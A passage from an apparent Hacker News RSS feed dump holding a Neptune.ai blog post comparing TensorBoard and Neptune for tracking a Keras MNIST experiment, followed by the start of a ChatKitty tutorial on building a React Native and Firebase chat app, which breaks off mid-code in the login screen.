rel="noreferrer noopener nofollow">Grad-CAM: Why did you say that? Visual Explanations from Deep Networks…</a></li><li><a href="https://arxiv.org/abs/2009.13935" target="_blank" rel="noreferrer noopener nofollow">A Comparative Study of Deep Learning Loss Functions for Multi-Label Remote Sensing Image Classification</a></li></ul>



<p>Blogs:</p>



<ul><li><a href="https://medium.com/@prince.canuma/wide-residual-nets-why-deeper-isnt-always-better-f2a02947dca3" target="_blank" rel="noreferrer noopener nofollow">Wide Residual Nets: “Why deeper isn’t always better…”</a></li><li><a href="https://machinelearningmastery.com/hyperparameters-for-classification-machine-learning-algorithms/" target="_blank" rel="noreferrer noopener nofollow">Tune Hyperparameters for Classification Machine Learning Algorithms</a></li><li><a href="https://towardsdatascience.com/image-pre-processing-c1aec0be3edf" target="_blank" rel="noreferrer noopener nofollow">Image Pre-Processing</a></li><li><a href="https://gombru.github.io/2018/05/23/cross_entropy_loss/" target="_blank" rel="noreferrer noopener nofollow">Understanding Categorical Cross-Entropy Loss, Binary Cross-Entropy Loss…</a></li><li><a href="https://paperswithcode.com/method/noisy-student" target="_blank" rel="noreferrer noopener nofollow">Noisy student</a></li><li><a href="https://machinelearningmastery.com/overfitting-and-underfitting-with-machine-learning-algorithms/" target="_blank" rel="noreferrer noopener nofollow">Overfitting and Underfitting With Machine Learning Algorithms</a></li><li><a href="https://medium.com/datadriveninvestor/developing-ai-projects-under-pressure-202cbab7428f" target="_blank" rel="noreferrer noopener nofollow">Developing AI projects under pressure</a>&nbsp;</li><li><a href="https://towardsdatascience.com/understanding-neural-networks-19020b758230" target="_blank" rel="noreferrer noopener nofollow">Understanding …</a></li></ul></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neptune.ai/blog/image-classification-tips-and-tricks-from-13-kaggle-competitions">https://neptune.ai/blog/image-classification-tips-and-tricks-from-13-kaggle-competitions</a></em></p>]]>
            </description>
            <link>https://neptune.ai/blog/image-classification-tips-and-tricks-from-13-kaggle-competitions</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197491</guid>
            <pubDate>Tue, 24 Nov 2020 11:27:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TensorBoard vs. Neptune: How Are They Different]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197478">thread link</a>) | @patrycjaneptune
<br/>
November 24, 2020 | https://neptune.ai/blog/tensorboard-vs-neptune-how-are-they-actually-different | <a href="https://web.archive.org/web/*/https://neptune.ai/blog/tensorboard-vs-neptune-how-are-they-actually-different">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <article class="page">
	
<p><a href="https://medium.com/louis-dorard/an-overview-of-ml-development-platforms-df953060b9a9" target="_blank" rel="noreferrer noopener nofollow">ML model development</a> typically involves a tedious workflow of managing data, feature engineering, model training and evaluation.&nbsp;</p>



<p>A data scientist could easily run in the order of hundreds of combinations of these things before converging onto a final model which solves the business problem. Managing those experiments, tracking progress and comparing them is an uphill battle which most data scientists fight everyday.&nbsp;</p>



<p>There are multiple tools available to make this process easier and today we will take a look at two of them. This writeup will take you through a <strong>deep comparison of TensorBoard with Neptune</strong>, one of the modern experiment management tools. We will take you through a model development cycle and compare the utility of TensorBoard and Neptune at various steps of the process. For the purpose of this comparison, we will be using the digit recognition problem with the MNIST dataset.</p>



<hr>



<p><strong><span><sup>SEE ALSO</sup></span></strong>&nbsp;<br>– <a href="https://neptune.ai/blog/tensorboard-tutorial" target="_blank" rel="noreferrer noopener nofollow">Deep Dive into TensorBoard: Tutorial With Examples</a><br>– <a href="https://neptune.ai/blog/the-best-tensorboard-alternatives" target="_blank" rel="noreferrer noopener nofollow">The Best TensorBoard Alternatives</a></p>



<hr>



<p><strong>Areas of comparison</strong></p>



<p>We will compare TensorBoard and Neptune by dividing the ML model development process into the following parts:</p>



<ul><li><strong>Exploratory Data Analysis</strong>: perform ad-hoc analysis on data to help in deciding training parameters, feature engineering, etc.</li><li>Experiment Setup: provide means to store multiple experiments together as an entity to allow easy comparison in the future.</li><li>Model Training &amp; Evaluation: train a model and look at the evaluation metrics to debug and compare performance.</li><li>Model Debugging: dig deeper into the training process and figure out what went wrong.</li><li>Hyperparameter Tuning: the ability to train multiple models, compare them easily, and <strong>pick a winner</strong></li><li><strong>Versioning</strong>: ability to add data/code/feature/model metadata for comparison.</li><li><strong><a href="https://neptune.ai/blog/best-software-for-collaborating-on-machine-learning-projects" target="_blank" rel="noreferrer noopener nofollow">Collaboration</a></strong>: allow multiple users to work together and manage access.</li></ul>






<h2>Exploratory Data Analysis (EDA)</h2>



<p>EDA is typically the first step in the process of developing an ML model. This is usually very custom to the problem at hand and requires high flexibility. Both TensorBoard and Neptune have light support for this.</p>



<p>Even though Neptune does not have tools to help you in EDA per-say, it allows us to visualize the ad-hoc analysis done using jupyter notebooks on the Neptune UI. This can be done using 2 ways:</p>



<ul><li>You can save notebook checkpoints directly into Neptune projects. <a href="https://ui.neptune.ai/neptune-ai/credit-default-prediction/n/1-0-eda-application-table-ac75c237-1630-4109-b532-dd125badec0e/ca1df3be-b2e4-4b26-99d6-b7e98a3d4273" target="_blank" rel="noreferrer noopener nofollow">Here</a> is an example of a public notebook containing EDA. If you want to check out how this works here are the docs.</li><li>You can attach custom charts or visualizations to the Neptune experiment. We will go through an example of this later.</li></ul>






<h2>Experiment Setup</h2>



<p>Before you start using any experiment management tool you need to set up an experiment so that it can be easily identified and referred to in the future. Here we will compare TensorBoard and Neptune on these aspects.&nbsp;</p>



<p>First, let’s define a project and experiment name which we will use for tracking.</p>



<pre>PROJECT = <span>'blog-neptune-vs-tensorboard'</span>
EXPERIMENT = <span>'model-1'</span>
</pre>



<p>Download the dataset:</p>



<pre>mnist = tf.keras.datasets.mnist
(X_train, y_train), (X_test, y_test) = mnist.load_data()
X_train, X_test = X_train / <span>255.0</span>, X_test / <span>255.0</span>
</pre>






<h3><strong>Tensorboard</strong></h3>



<p>Tensorboard has no direct support for setting up an experiment. We need to create a directory structure ourselves and store logs in there. The good thing is that it works with Google Cloud Storage and AWS S3 paths so that all data can be stored and read from the cloud directly.</p>



<p>Here, we will create a local directory for a project and then another for an experiment.</p>



<pre>
DATA_BASE = Path(<span>'../neptune.ai'</span>)</pre>



<pre>
project_dir = DATA_BASE / <span>'blog-tensorboard-vs-neptune'</span>
exp_dir = project_dir / <span>'first-model'</span>
<span>if</span> <span>not</span> project_dir.exists():
    project_dir.mkdir()
<span>if</span> <span>not</span> exp_dir.exists():
    exp_dir.mkdir()
</pre>






<h3><strong>Neptune</strong></h3>



<p>Experiment creation and management are first-class citizens in Neptune. It allows us to create a project within which multiple experiments can be added and compared. All this is managed seamlessly on the Neptune server.</p>



<p>First, we created a project called “blog-tensorboard-vs-neptune” on the Neptune UI (<a href="https://docs.neptune.ai/workspace-project-and-user-management/projects/create-project.html" target="_blank" rel="noreferrer noopener nofollow">docs on how to do it</a>). Now we can initialize the neptune client pointing to that project and create experiments in it.</p>



<pre><span>import</span> neptune
neptune_project = neptune.init(f<span>'aarshay/{PROJECT}'</span>)
neptune_experiment = neptune_project.create_experiment(name=EXPERIMENT)</pre>



<p>As we can see, Neptune gave us an automated ID called `BLOG-1` for the experiment. We can see this on Neptune UI as:</p>



<figure><img loading="lazy" width="1024" height="243" src="https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard.png?resize=1024%2C243&amp;ssl=1" alt="neptune vs tensorboard" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard.png?resize=1024%2C243&amp;ssl=1 1024w, https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard.png?resize=300%2C71&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard.png?resize=768%2C182&amp;ssl=1 768w, https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard.png?resize=1536%2C365&amp;ssl=1 1536w, https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>






<h2>Model Training &amp; Evaluation</h2>



<p>Model training is typically carried out using off-the-shelf tools like Keras which we’ll be using here. Model evaluation involves looking at the loss function and other metrics of concern. Both TensorBoard and Neptune provide fairly good support for model evaluation.</p>



<p>Let’s train a simple model using Keras.</p>



<pre>model = tf.keras.models.Sequential([
   tf.keras.layers.Flatten(input_shape=(<span>28</span>, <span>28</span>)),
   tf.keras.layers.Dense(<span>64</span>, activation=<span>'relu'</span>),
   tf.keras.layers.Dense(<span>64</span>, activation=<span>'relu'</span>),
   tf.keras.layers.Dense(<span>10</span>, activation=<span>'softmax'</span>)])

model.compile(optimizer=<span>'sgd'</span>, 
   loss=<span>'sparse_categorical_crossentropy'</span>,
   metrics=[<span>'accuracy'</span>])
</pre>



<p>Both neptune and tf logging can be achieved using callbacks:</p>



<pre><span>from</span> tensorflow.keras.callbacks <span>import</span> TensorBoard, Callback
</pre>






<h3><strong>Tensorboard</strong></h3>



<p>There is a predefined callback method that allows you to log model metrics onto a specific location. Note that this is the same location which we defined in step 1. You can read more about the parameters in the <a href="https://www.tensorflow.org/api_docs/python/tf/keras/callbacks/TensorBoard" target="_blank" rel="noreferrer noopener nofollow">official doc</a>.</p>



<pre>tb_callback = TensorBoard(
    log_dir=exp_dir,
    histogram_freq=<span>1</span>,
    write_graph=<span>True</span>,
    write_images=<span>True</span>,
    update_freq=<span>'epoch'</span>,
    profile_batch=<span>2</span>,
    embeddings_freq=<span>1</span>)
</pre>






<h3><strong>Neptune</strong></h3>



<p>For Neptune, a custom callback can be defined which will log model metrics to Neptune at the end of every epoch (you can also use the <a href="https://docs.neptune.ai/integrations/keras.html" target="_blank" rel="noreferrer noopener nofollow">predefined Neptune callback for Keras</a>).&nbsp;&nbsp;</p>



<pre><span><span>class</span> <span>NeptuneLoggingCallback</span><span>(Callback)</span>:</span>
     <span><span>def</span> <span>on_epoch_end</span><span>(self, epoch, logs=None)</span>:</span>
        <span>for</span> metric_name, metric_value <span>in</span> logs.items():
            neptune.log_metric(metric_name, metric_value)

neptune_callback = NeptuneLoggingCallback()
</pre>



<p>Now we will pass both of these callbacks to the model fit method and train the model:</p>



<pre>callbacks = [tb_callback, neptune_callback]
model.fit(X_train, y_train,
          epochs=<span>10</span>,
          validation_split=<span>0.2</span>,
          callbacks=callbacks)
</pre>



<p><strong>Test set performance</strong></p>



<pre>test_loss, test_accuracy = model.evaluate(X_test, y_test)
</pre>



<pre>neptune.log_metric(<span>'test-loss'</span>, test_loss)
neptune.log_metric(<span>'test-accuracy'</span>, test_accuracy)
</pre>



<p>Both TensorBoard and Neptune show the loss and accuracy metrics for training and evaluation runs.</p>



<p>The TensorBoard UI looks as:</p>



<div><figure><img loading="lazy" width="1024" height="552" src="https://i0.wp.com/neptune.ai/wp-content/uploads/tensorboard-UI.png?resize=1024%2C552&amp;ssl=1" alt="tensorboard UI" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/tensorboard-UI.png?resize=1024%2C552&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/tensorboard-UI.png?resize=300%2C162&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/tensorboard-UI.png?resize=768%2C414&amp;ssl=1 768w, https://i0.wp.com/neptune.ai/wp-content/uploads/tensorboard-UI.png?resize=1536%2C828&amp;ssl=1 1536w, https://i0.wp.com/neptune.ai/wp-content/uploads/tensorboard-UI.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p>Here each plot contains a line for train and validation runs.</p>



<p>In Neptune, the project page has additional metrics added:</p>



<figure><img loading="lazy" width="1024" height="236" src="https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard-metrics.png?resize=1024%2C236&amp;ssl=1" alt="neptune vs tensorboard metrics" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard-metrics.png?resize=1024%2C236&amp;ssl=1 1024w, https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard-metrics.png?resize=300%2C69&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard-metrics.png?resize=768%2C177&amp;ssl=1 768w, https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard-metrics.png?resize=1536%2C354&amp;ssl=1 1536w, https://i2.wp.com/neptune.ai/wp-content/uploads/neptune-vs-tensorboard-metrics.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>



<p>Also, inside the experiment, we see these metrics as both charts and logs:</p>



<figure><img loading="lazy" width="1024" height="563" src="https://i1.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics.png?resize=1024%2C563&amp;ssl=1" alt="Neptune metrics" srcset="https://i1.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics.png?resize=1024%2C563&amp;ssl=1 1024w, https://i1.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics.png?resize=300%2C165&amp;ssl=1 300w, https://i1.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics.png?resize=768%2C422&amp;ssl=1 768w, https://i1.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics.png?resize=1536%2C844&amp;ssl=1 1536w, https://i1.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>






<hr>



<figure><img loading="lazy" width="1024" height="368" src="https://i0.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics-2.png?resize=1024%2C368&amp;ssl=1" alt="Neptune metrics" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics-2.png?resize=1024%2C368&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics-2.png?resize=300%2C108&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics-2.png?resize=768%2C276&amp;ssl=1 768w, https://i0.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics-2.png?resize=1536%2C552&amp;ssl=1 1536w, https://i0.wp.com/neptune.ai/wp-content/uploads/Neptune-metrics-2.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure>






<h2>Model Train Debugging</h2>



<p>Simply knowing the eval metrics is not always enough. If the model does not perform as expected, we enter into the hell of neural network debugging (if you do get there check out this <a href="http://josh-tobin.com/troubleshooting-deep-neural-networks.html" target="_blank" rel="noreferrer noopener nofollow">resource on DL troubleshooting</a>). This typically involves evaluating the model on more metrics and understanding if something went wrong during the training itself.</p>



<p>TensorBoard provides a lot of model training characteristics right off-the-bat.&nbsp;</p>



<ul><li>We can visualize network architecture and distributions of weights and gradients over time. This allows us to get an intuition to tune the model’s training parameters like learning rate and weight initialization.&nbsp;</li><li>It provides a projector for visualizing vector embeddings.</li><li>There is a profiler which can be used to debug model training times. This is particularly useful when we’re using a GPU and trying to minimize model training time by parallelizing reads with GPU processing.</li><li>TensorBoard also has the flexibility to add custom images which can be used to understand training data, confusion matrices or any ad-hoc information.</li></ul>



<p>You could refer to our <a href="https://neptune.ai/blog/tensorboard-tutorial" target="_blank" rel="noreferrer noopener nofollow">dedicated blog</a> on TensorBoard for detailed examples on these. For illustration, the network graphs and histograms are shown below:</p>



<div><figure><img loading="lazy" src="https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-graphs.png?resize=768%2C538&amp;ssl=1" alt="tensorboard graphs" width="768" height="538" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-graphs.png?resize=1024%2C717&amp;ssl=1 1024w, https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-graphs.png?resize=300%2C210&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-graphs.png?resize=768%2C538&amp;ssl=1 768w, https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-graphs.png?resize=1536%2C1076&amp;ssl=1 1536w, https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-graphs.png?w=1576&amp;ssl=1 1576w" sizes="(max-width: 768px) 100vw, 768px" data-recalc-dims="1"></figure></div>






<hr>



<div><figure><img loading="lazy" src="https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-histograms.png?resize=768%2C536&amp;ssl=1" alt="tensorboard histograms" width="768" height="536" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-histograms.png?resize=1024%2C714&amp;ssl=1 1024w, https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-histograms.png?resize=300%2C209&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-histograms.png?resize=768%2C536&amp;ssl=1 768w, https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-histograms.png?resize=1536%2C1071&amp;ssl=1 1536w, https://i2.wp.com/neptune.ai/wp-content/uploads/tensorboard-histograms.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 768px) 100vw, 768px" data-recalc-dims="1"></figure></div>



<p>Neptune does not provide any metrics off-the-bat, but it makes it really easy to add custom images and dynamic charts through its integrations with third-party libraries like <a href="http://matplotlib.org/" target="_blank" rel="noreferrer noopener nofollow">Matplotlib</a>, <a href="https://optuna.org/" target="_blank" rel="noreferrer noopener nofollow">Optuna</a>, <a href="https://github.com/ModelOriented/DALEX" target="_blank" rel="noreferrer noopener nofollow">Dalex</a>, <a href="https://altair-viz.github.io/" target="_blank" rel="noreferrer noopener nofollow">Altair</a>, etc.</p>






<h3><strong>Image Logging with Matplotlib</strong></h3>



<p>Let us compare the process of logging a custom image on TensorBoard and Neptune. We need an image first, let’s use the scikit-plots library to create ROC curves for all the labels and push that as an image.</p>



<pre><span>import</span> numpy <span>as</span> np
<span>from</span> scikitplot.metrics <span>import</span> plot_roc

predicted_probs = model.predict(X_test)
predicted_labels = np.argmax(predicted_probs, axis=<span>1</span>)
figure, ax = plt.subplots(<span>1</span>,<span>1</span>,figsize=(<span>8</span>,<span>8</span>))
plot_roc(y_test, predicted_probs, ax=ax)</pre>



<p>Pushing this in TensorBoard requires the following code:</p>



<pre><span>import</span> io

<span><span>def</span> <span>figure_to_tf_image</span><span>(figure)</span>:</span>    
    buffer = io.BytesIO()
    figure.savefig(buffer, format=<span>'png'</span>)
    buffer.seek(<span>0</span>)

    tf_image = tf.image.decode_png(buffer.getvalue(), channels=<span>4</span>)
    tf_image = tf.expand_dims(tf_image, <span>0</span>)

    <span>return</span> tf_image

file_writer = tf.summary.create_file_writer(str(exp_dir))
<span>with</span> file_writer.as_default():
    tf.summary.image(<span>"ROC Curves"</span>, figure_to_tf_image(figure), step=<span>0</span>)
</pre>



<p>This would show up in the tensorboard UI as:</p>



<div><figure><img loading="lazy" width="512" height="372" src="https://i0.wp.com/neptune.ai/wp-content/uploads/tensorboard-image-logging.png?resize=512%2C372&amp;ssl=1" alt="tensorboard image logging" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/tensorboard-image-logging.png?w=512&amp;ssl=1 512w, https://i0.wp.com/neptune.ai/wp-content/uploads/tensorboard-image-logging.png?resize=300%2C218&amp;ssl=1 300w" sizes="(max-width: 512px) 100vw, 512px" data-recalc-dims="1"></figure></div>



<p>However, pushing this to Neptune requires just 2 lines:</p>



<pre><span>from</span> neptunecontrib.api <span>import</span> log_chart
log_chart(name=<span>'ROC Curves'</span>, chart=figure, experiment=neptune_experiment)
</pre>



<p>This would appear as below. Note that the chart below is actually an interactive plot, Neptune handles that under the hood.</p>



<figure><img loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/neptune-image-logging.png?resize=768%2C605&amp;ssl=1" alt="neptune image logging" width="768" height="605" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/neptune-image-logging.png?resize=1024%2C807&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/neptune-image-logging.png?resize=300%2C236&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/neptune-image-logging.png?resize=768%2C605&amp;ssl=1 768w, https://i0.wp.com/neptune.ai/wp-content/uploads/neptune-image-logging.png?resize=1536%2C1211&amp;ssl=1 1536w, https://i0.wp.com/neptune.ai/wp-content/uploads/neptune-image-logging.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 768px) 100vw, 768px" data-recalc-dims="1"></figure>



<p>You can find this chart on Neptune <a href="https://ui.neptune.ai/aarshay/blog-neptune-vs-tensorboard/e/BLOG-1/artifacts?path=charts%2F&amp;file=altair_confusion_matrix.html">here</a>.</p>



<p>Along with logging images, Neptune enables us to log almost anything to the experiments API for …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neptune.ai/blog/tensorboard-vs-neptune-how-are-they-actually-different">https://neptune.ai/blog/tensorboard-vs-neptune-how-are-they-actually-different</a></em></p>]]>
            </description>
            <link>https://neptune.ai/blog/tensorboard-vs-neptune-how-are-they-actually-different</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197478</guid>
            <pubDate>Tue, 24 Nov 2020 11:25:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Serverless Cloud Platform for Building Chat Apps with Node.js]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197365">thread link</a>) | @aaronnwabuoku
<br/>
November 24, 2020 | https://www.chatkitty.com/blog/posts/building-a-chat-app-with-react-native-and-firebase-part-1/ | <a href="https://web.archive.org/web/*/https://www.chatkitty.com/blog/posts/building-a-chat-app-with-react-native-and-firebase-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>In <a href="https://www.chatkitty.com/blog/posts/building-a-chat-app-with-react-native-and-firebase-part-1/">this tutorial series</a>
, I'll be showing you how to build a functional and secure chat app using 
the latest React Native libraries, the Expo framework, and Firebase, powered by the ChatKitty platform.</p><div>
          <p>This is the first article of this series. After reading this article, you will be able to:</p>
<ol>
<li><p>Create an Expo React Native application</p>
</li>
<li><p>Create a Firebase project for user authentication</p>
</li>
<li><p>Create a ChatKitty project and connect to ChatKitty to provide real-time chat functionality</p>
</li>
<li><p>Use Firebase Authentication and ChatKitty Chat Functions to securely implement user login</p>
</li>
</ol>
<h2 id="what-is-react-native">What is React Native?</h2>
<p><a href="https://reactnative.dev/">React Native</a> is a great way to develop both web and mobile applications very 
quickly, while sharing a lot of code when targeting multiple platforms. With a mature ecosystem of libraries 
and tooling, using React Native is not only fast but also reliable. Trusted by organizations like Facebook, 
Shopify, and Tesla - React Native is a stable framework for building both iOS and Android apps.</p>
<h2 id="what-is-expo">What is Expo?</h2>
<p>The <a href="https://expo.io/">Expo</a> framework builds on top of React Native to allow developers to build universal 
React applications in minutes. With Expo, you can develop, build, deploy and quickly iterate on iOS, Android and web 
apps from the same JavaScript code. Expo has made creating both web and mobile applications very accessible, 
handling would-be complex workflows like multi-platform deployment and advanced features like push notifications.</p>
<h2 id="what-is-firebase">What is Firebase?</h2>
<p><a href="https://firebase.google.com/">Firebase</a> is a <a href="https://www.cloudflare.com/learning/serverless/glossary/backend-as-a-service-baas/">Backend-as-a-Service</a> 
offering by Google. It provides developers a wide array of tools and services to develop quality apps 
without having to manage servers. Firebase provides key features like authentication, a real-time database, and hosting.</p>
<h2 id="what-are-chatkitty-chat-functions">What are ChatKitty Chat Functions?</h2>
<p>ChatKitty provides <strong>Chat Functions</strong>, <a href="https://www.cloudflare.com/learning/serverless/what-is-serverless/">serverless</a> 
cloud functions that allow you to define custom logic for complex tasks like user authentication, and respond 
to chat events that happen within your application. With ChatKitty Chat Functions, there's no need for you 
to build a backend to develop chat apps. ChatKitty Chat Functions auto-scale for you, and only cost you when they run.
Chat Functions lower the total cost of maintaining your chat app, enabling you to build more logic, faster.</p>
<h2 id="prerequisites">Prerequisites</h2>
<p>To develop apps with Expo and React Native, you should be able to write and understand JavaScript or 
TypeScript code. To define ChatKitty Chat Functions, you'll need to be familiar with basic JavaScript.</p>
<p>You'll need a version of <a href="https://nodejs.org/en/download/">Node.js</a> above <code>10.x.x</code> installed on your local machine 
to build this React Native app.</p>
<p>You'll need to install the <a href="https://docs.expo.io/workflow/expo-cli/">Expo CLI tool</a> through npm or npx.</p>
<p>For a complete walk-through on how to set up a development environment for Expo, you can go through 
<a href="https://docs.expo.io/get-started/installation/">the official documentation here</a>.</p>
<p>You can checkout our Expo React Native sample code any time <a href="https://github.com/ChatKitty/chatkitty-example-react-native/">on GitHub</a>.</p>
<h2 id="creating-project-and-installing-libraries">Creating project and installing libraries</h2>
<p>First, initialize a new Expo project with the <strong>blank managed</strong> workflow. To do so, you're going to 
need to open a terminal window and execute:</p>
<pre><code>expo init chatkitty-example-react-native</code></pre>


<p>After creating the initial application. You can enter the app root directory and run the app:</p>
<pre><code># navigate inside the project directory
cd chatkitty-example-react-native

# for android
expo start --android

# for ios
expo start --ios

# for web 
expo start --web</code></pre>


<p>If you run your newly created React Native application using Expo, you should see:</p>
<p><img src="https://www.chatkitty.com/images/blog/posts/building-a-chat-app-with-react-native-and-firebase-part-1/screenshot-created-project.png" alt="Screenshot: Created Project">  </p>
<p>Now we have our blank project, we can install the React Native libraries we'll need:</p>
<pre><code># install following libraries for React Native and Firebase
yarn add @react-navigation/native @react-navigation/stack react-native-reanimated react-native-gesture-handler react-native-screens react-native-safe-area-context @react-native-community/masked-view react-native-paper react-native-vector-icons firebase</code></pre>
<h2 id="creating-reusable-form-elements">Creating reusable form elements</h2>
<p>We'll be creating Login and Signup screens soon which share similar logic. To prevent us from violating 
the <a href="https://thevaluable.dev/dry-principle-cost-benefit-example/">DRY principle</a>, let's create some 
reusable form components that we can share across these two screens. We'll also create a loading spinner 
component to provide a good user experience whenever a user waits for a long screen transition.</p>
<p>We'll create reusable <code>FormInput</code>, <code>FormButton</code>, and <code>Loading</code> UI components. At the root of this Expo
React Native app, create a <code>src/</code> directory and inside it create another new <code>components/</code> directory.</p>
<p>Inside the <code>src/components/</code> directory, create a new JavaScript file <code>FormInput.js</code>. In this file, we'll 
define a <a href="https://reactjs.org/docs/react-component.html">React component</a> to provide a text input field 
for our Login and Signup screens to use for the user to enter their credentials.</p>
<p>The <code>FormInput.js</code> file should contain the following code snippet:</p>
<pre><code>import React from 'react';
import { StyleSheet, Dimensions } from 'react-native';
import { TextInput } from 'react-native-paper';

const { width, height } = Dimensions.get('screen');

export default function FormInput({ labelName, ...rest }) {
  return (
    &lt;TextInput
      label={labelName}
      style={styles.input}
      numberOfLines={1}
      {...rest}
    /&gt;
  );
}

const styles = StyleSheet.create({
  input: {
    marginTop: 10,
    marginBottom: 10,
    width: width / 1.5,
    height: height / 15,
  },
});</code></pre>


<p>Our next reusable component is going to be in another file <code>FormButton.js</code>. We use it to display a button 
for a user to confirm their credentials.</p>
<p>The <code>FormButton.js</code> file should contain:</p>
<pre><code>import React from 'react';
import { StyleSheet, Dimensions } from 'react-native';
import { Button } from 'react-native-paper';

const { width, height } = Dimensions.get('screen');

export default function FormButton({ title, modeValue, ...rest }) {
  return (
    &lt;Button
      mode={modeValue}
      {...rest}
      style={styles.button}
      contentStyle={styles.buttonContainer}
    &gt;
      {title}
    &lt;/Button&gt;
  );
}

const styles = StyleSheet.create({
  button: {
    marginTop: 10,
  },
  buttonContainer: {
    width: width / 2,
    height: height / 15,
  },
});</code></pre>


<p>Finally, create a <code>Loading.js</code> file. We'll use it to display a loading spinner when a user waits for a 
screen transition.</p>
<p>The <code>Loading.js</code> file should contain:</p>
<pre><code>import React from 'react';
import { View, ActivityIndicator, StyleSheet } from 'react-native';

export default function Loading() {
  return (
    &lt;View style={styles.loadingContainer}&gt;
      &lt;ActivityIndicator size="large" color="#5b3a70" /&gt;
    &lt;/View&gt;
  );
}

const styles = StyleSheet.create({
  loadingContainer: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
  },
});</code></pre>


<p>Now we have our reusable form components, we can create a Login screen for users to enter our chat app.</p>
<h2 id="creating-a-login-screen">Creating a login screen</h2>
<div><p>The first screen we'll be creating is the login screen. We'll ask an existing user for their email and 
password to authenticate and provide a link to a future sign up form for new users to register with our app.
</p><p>
The login screen should look like this after you're done:</p></div>
<p><img src="https://www.chatkitty.com/images/blog/posts/building-a-chat-app-with-react-native-and-firebase-part-1/screenshot-login-screen.png" alt="Screenshot: Login screen">  </p>
<p>Inside the <code>src/</code>, create a <code>screens/</code> directory, inside this directory create a <code>LoginScreen.js</code> file.</p>
<p>The <code>LoginScreen.js</code> file should contain:</p>
<pre><code>import React, { useState } from 'react';
import { View, StyleSheet } from 'react-native';
import { Title } from 'react-native-paper';
import FormInput from '../components/FormInput';
import FormButton from '../components/FormButton';

export default function LoginScreen({ navigation }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  return (
    &lt;View style={styles.container}&gt;
      &lt;Title style={styles.titleText}&gt;Welcome!&lt;/Title&gt;
      &lt;FormInput
        labelName="Email"
        value={email}
        autoCapitalize="none"
        onChangeText={(userEmail) =&gt; setEmail(userEmail)}
      /&gt;
      &lt;FormInput
        labelName="Password"
        value={password}
        secureTextEntry={true}
        onChangeText={(userPassword) =&gt; setPassword(userPassword)}
      /&gt;
      &lt;FormButton
        title="Login"
        modeValue="contained"
        labelStyle={styles.loginButtonLabel}
        onPress={() =&gt; {
          // TODO
        }}
      /&gt;
      &lt;FormButton
        title="Sign up here"
